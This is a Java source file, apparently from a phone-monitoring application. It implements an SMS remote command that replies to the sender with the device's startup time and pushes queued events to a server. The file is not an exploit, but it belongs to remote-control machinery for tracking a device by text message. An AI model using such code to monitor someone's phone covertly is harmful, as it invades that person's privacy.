package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.info.StartupTimeDb;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSRequestStartupTime extends RmtCmdSync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	private StartupTimeDb startupTime = Global.getStartupTimeDb();
	
	public SMSRequestStartupTime(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getRequestStartupTimeCmd());
		try {
			responseMessage.append(Constant.OK);	
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.REQUEST_STARTUP_TIME);
			responseMessage.append(startupTime.getStartupTime());
		} catch(Exception e) {
			Log.error("SMSRequestStartupTime.execute()", e.getMessage(), e);
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("SMSRequestStartupTime.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
